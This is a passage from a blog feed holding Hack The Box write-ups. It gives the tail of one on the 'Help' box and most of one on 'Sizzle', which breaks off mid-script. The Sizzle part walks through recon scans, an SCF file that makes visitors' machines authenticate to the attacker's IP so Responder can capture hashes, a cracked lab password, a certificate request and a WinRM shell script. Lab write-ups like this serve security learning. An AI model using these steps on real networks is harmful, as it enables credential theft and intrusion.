Mode : dir [+] Url/Domain : http://help.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/06/07 13:03:25 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /support (Status: 301) ===================================================== 2019/06/07 13:05:25 Finished ===================================================== I went to /support and there was a web application called HelpDeskZ : File Upload Vulnerability A quick search and I found an unauthenticated file upload vulnerability that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload php files because they are allowed by default.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/help/0.png" /></entry><entry><title type="html">Hack The Box - Sizzle</title><link href="http://localhost:4000/hack-the-box/sizzle/" rel="alternate" type="text/html" title="Hack The Box - Sizzle" /><published>2019-06-01T00:00:00+02:00</published><updated>2019-06-01T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/sizzle</id><content type="html" xml:base="http://localhost:4000/hack-the-box/sizzle/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-sizzle-retired-and-heres-my-write-up-about-it-sizzle-was-a-great-machine-everything-about-it-was-great-it-was-very-realistic-fun-and-of-course-challenging-as-it-was-rated-insane-personally-one-of-my-favorites-and-one-of-the-best-active-directory-boxes-i-have-ever-solved-it-starts-by-getting-write-access-to-a-directory-in-an-smb-share-a-simple-scf-file-attack-with-responder-and-john-could-give-me-a-password-for-a-user-with-that-password-i-could-generate-a-certificate-request-and-get-a-certificate-then-a-winrm-session-after-that-comes-the-most-challenging-part-about-the-box-which-is-bypassing-antivirus-kerberoasting-and-privilege-escalation-but-before-doing-that-we-will-take-a-look-at-an-unintended-way-first-that-was-the-box-in-a-nutshell-its-a-windows-box-and-its-ip-is-101010103-i-added-it-to-etchosts-as-sizzlehtb-lets-jump-right-in-&quot;&gt;Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; share, a simple &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file attack with &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; could give me a password for a user. With that password I could generate a certificate request and get a certificate then a &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.103&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;sizzle.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC sizzle.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/1.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb
Nmap scan report for sizzle.htb (10.10.10.103)
Host is up (0.15s latency).
Not shown: 987 filtered ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:44+00:00; -6s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:43+00:00; -5s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:42+00:00; -6s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=5/31%Time=5CF1678A%P=i686-pc-linux-gnu%r(DNSVer
SF:sionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0
SF:4bind\0\0\x10\0\x03&quot;);
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5s, deviation: 0s, median: -6s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-05-31 19:44:44
|_  start_date: 2019-05-31 12:06:07

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 31 19:45:27 2019 -- 1 IP address (1 host up) scanned in 232.62 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-got-a-lot-of-ports-we-got-ftp-on-port-21-dns-on-port-53-http-on-port-80-smb-and-ldap-we-also-see-that-the-domain-is-htblocal-and-commonname-is-sizzlehtblocal-so-i-added-it-to-etchosts-&quot;&gt;We got a lot of ports, we got &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; on port 21, &lt;code class=&quot;highlighter-rouge&quot;&gt;dns&lt;/code&gt; on port 53, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80, &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt;. We also see that the domain is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTB.LOCAL&lt;/code&gt; and commonName is &lt;code class=&quot;highlighter-rouge&quot;&gt;sizzle.htb.local&lt;/code&gt;, so I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;anonymous-authentication-on-ftp-was-allowed-but-there-was-nothing-there-so-i-will-skip-that&quot;&gt;anonymous authentication on &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; was allowed but there was nothing there so I will skip that.&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-that-http-server-and-the-index-only-had-this-gif-&quot;&gt;I checked that &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; server and the index only had this &lt;code class=&quot;highlighter-rouge&quot;&gt;gif&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-ran-gobuster-&quot;&gt;So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://sizzle.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/31 19:51:59 Starting gobuster
=====================================================
/aspnet_client (Status: 301)
/certenroll (Status: 301)
/Images (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
=====================================================
2019/05/31 19:53:24 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;certenroll-sounds-interesting-but-unfortunately-its-a-403-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/certenroll&lt;/code&gt; sounds interesting, but unfortunately it’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-time-to-check-smb-&quot;&gt;It’s time to check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; .&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb-scf-file-attack-amandas-credentials&quot;&gt;SMB, SCF File Attack, amanda’s Credentials&lt;/h3&gt;
&lt;h4 id=&quot;first-thing-we-need-to-know-is-the-shares-we-can-use-smbclient-to-list-the-shares-&quot;&gt;First thing we need to know is the shares, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; to list the shares :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient --list //sizzle.htb/ -U &quot;&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-noticed-that-there-was-a-share-for-active-directory-certificate-services-most-likely-certsrv-will-be-on-the-web-server-&quot;&gt;I noticed that there was a share for Active Directory Certificate Services. Most likely &lt;code class=&quot;highlighter-rouge&quot;&gt;/certsrv&lt;/code&gt; will be on the web server :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://sizzle.htb/certsrv&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;yes-it-was-there-and-we-need-credentials-back-to-smb-the-only-share-i-could-access-anonymously-was-department-shares-&quot;&gt;Yes it was there, and we need credentials. Back to &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; the only share I could access anonymously was &lt;code class=&quot;highlighter-rouge&quot;&gt;Department Shares&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-had-a-lot-of-directories-i-could-write-to-2-of-them---zz_archive-and-userspublic&quot;&gt;It had a lot of directories, I could write to 2 of them :  &lt;code class=&quot;highlighter-rouge&quot;&gt;ZZ_ARCHIVE&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Users/Public&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-are-looking-for-credentials-since-we-can-write-to-one-of-the-directories-then-we-can-possibly-apply-an-scf-file-attack-you-can-read-about-it-here-we-are-going-to-put-an-scf-file-in-userspublic-it-looks-like-this-&quot;&gt;We are looking for credentials. Since we can write to one of the directories then we can possibly apply an &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file attack. You can read about it &lt;a href=&quot;https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/&quot;&gt;here&lt;/a&gt;. We are going to put an &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file in &lt;code class=&quot;highlighter-rouge&quot;&gt;Users/Public&lt;/code&gt;. It looks like this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Shell]
Command=2
IconFile=\\10.10.xx.xx\share\rick.ico
[Taskbar]
Command=ToggleDesktop
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-we-will-run-responder-whenever-a-user-browses-that-directory-he-will-automatically-try-to-connect-to-my-box-through-smb-thats-when-responder-catches-the-hashes-more-info-in-the-link-above&quot;&gt;Then we will run &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt;. Whenever a user browses that directory he will automatically try to connect to my box through &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;, that’s when &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; catches the hashes. More info in the link above.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/12.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;reponder -I tun0&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;responder-caught-hash-for-a-user-called-amanda-lets-crack-it-with-john-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; caught hash for a user called &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;. Let’s crack it with &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-password-is-ashare1972&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;Ashare1972&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;requesting-a-certificate-winrm-session-as-amanda&quot;&gt;Requesting a Certificate, WinRm Session as amanda&lt;/h3&gt;
&lt;h4 id=&quot;i-tried-to-access-certenroll-as-amanda-and-it-worked-fine-&quot;&gt;I tried to access &lt;code class=&quot;highlighter-rouge&quot;&gt;certenroll&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt; and it worked fine :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-went-to-certsrv--and-used-amandas-credentials-to-authenticate&quot;&gt;So I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/certsrv&lt;/code&gt;  and used &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;’s credentials to authenticate&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-its-time-to-get-a-certificate-but-wait-a-second-whats-the-certificate-for-anyway-&quot;&gt;Now it’s time to get a certificate. But wait a second, what’s the certificate for anyway ?&lt;/h4&gt;
&lt;h4 id=&quot;a-full-nmap-scan-shows-that-winrm-ports-are-open-&quot;&gt;A full &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan shows that &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; ports are open :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p- -T5 -vvv --max-retries 1 sizzle.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output--1&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 31 20:22:10 2019 as: nmap -p- -T5 -vvv -o nmapfull --max-retries 1 sizzle.htb
Warning: 10.10.10.103 giving up on port because retransmission cap hit (1).
Nmap scan report for sizzle.htb (10.10.10.103)
Host is up, received echo-reply ttl 127 (0.11s latency).
Scanned at 2019-05-31 20:22:10 EET for 220s
Not shown: 65506 filtered ports
Reason: 65506 no-responses
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49682/tcp open  unknown          syn-ack ttl 127
49683/tcp open  unknown          syn-ack ttl 127
49686/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49701/tcp open  unknown          syn-ack ttl 127
54195/tcp open  unknown          syn-ack ttl 127
54204/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri May 31 20:25:50 2019 -- 1 IP address (1 host up) scanned in 220.02 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 5985,5986 -sV -sT -sC sizzle.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output--2&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 31 20:27:46 2019 as: nmap -p 5985,5986 -sV -sT -sC -o nmapwinrm sizzle.htb
Nmap scan report for sizzle.htb (10.10.10.103)
Host is up (0.11s latency).

PORT     STATE SERVICE  VERSION
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-05-31T17:56:26
|_Not valid after:  2020-05-30T17:56:26
|_ssl-date: 2019-05-31T18:28:30+00:00; -6s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -6s, deviation: 0s, median: -6s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 31 20:28:43 2019 -- 1 IP address (1 host up) scanned in 57.38 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;port-5985-uses-http-while-5986-uses-https-when-i-got-amandas-credentials-i-tried-to-connect-to-port-5985-and-i-couldnt-so-we-will-do-it-through-port-5986-thats-why-we-need-a-certificate-if-you-dont-know-how-to-connect-through-winrm-well-get-to-that-later&quot;&gt;Port 5985 uses &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; while &lt;code class=&quot;highlighter-rouge&quot;&gt;5986&lt;/code&gt; uses &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;. When I got &lt;code class=&quot;highlighter-rouge&quot;&gt;amanda&lt;/code&gt;’s credentials I tried to connect to port 5985 and I couldn’t, So we will do it through port 5986 that’s why we need a certificate. (If you don’t know how to connect through &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt;, we’ll get to that later.)&lt;/h4&gt;
&lt;h4 id=&quot;we-will-generate-a-certificate-request-and-a-private-key-&quot;&gt;We will generate a certificate request and a private key :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl req -newkey rsa:2048 -nodes -keyout request.key -out request.csr&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-submit-an-advanced-certificate-request-paste-our-request-and-download-the-certificate-base64-encoded&quot;&gt;Then we will submit an advanced certificate request, paste our request and download the certificate (base64 encoded)&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/22.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-use-winrm-but-whats-winrm-&quot;&gt;Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt;, but what’s &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; ?&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;Windows Remote Management (WinRM) is the Microsoft implementation of &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/winrm/ws-management-protocol&quot;&gt;WS-Management Protocol&lt;/a&gt;, a standard Simple Object Access Protocol (SOAP)-based, firewall-friendly protocol that allows hardware and operating systems, from different vendors, to interoperate.
The WS-Management protocol specification provides a common way for systems to access and exchange management information across an IT infrastructure. WinRM and &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/winrm/windows-remote-management-glossary&quot;&gt;&lt;em&gt;Intelligent Platform Management Interface (IPMI)&lt;/em&gt;&lt;/a&gt;, along with the &lt;a href=&quot;https://go.microsoft.com/fwlink/p/?linkid=84396&quot;&gt;Event Collector&lt;/a&gt; are components of the &lt;a href=&quot;https://go.microsoft.com/fwlink/p/?linkid=45204&quot;&gt;Windows Hardware Management&lt;/a&gt; features. -&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/winrm/portal&quot;&gt;Microsoft&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;winrm-is-not-meant-to-be-used-from-linux-but-luckily-theres-a-ruby-library-for-it-thats-how-we-will-connect&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; is not meant to be used from Linux but luckily there’s a &lt;a href=&quot;https://github.com/WinRb/WinRM&quot;&gt;Ruby library&lt;/a&gt; for it. That’s how we will connect.&lt;/h4&gt;
&lt;h4 id=&quot;i-used-alamots-shell-and-added-some-stuff-for-the-cert-and-the-key-&quot;&gt;I used &lt;a href=&quot;https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb&quot;&gt;Alamot’s shell&lt;/a&gt; and added some stuff for the cert and the key :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'winrm'&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Author: Alamot&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; 
  &lt;span class=&quot;ss&quot;&gt;endpoint: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://10.10.10.103:5986/wsman'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;transport: :ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;client_cert: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/root/Desktop/HTB/boxes/sizzle/certs/certnew.cer'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;client_key: &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/root/Desktop/HTB/boxes/sizzle/certs/request.key'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;:no_ssl_peer_verification&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;

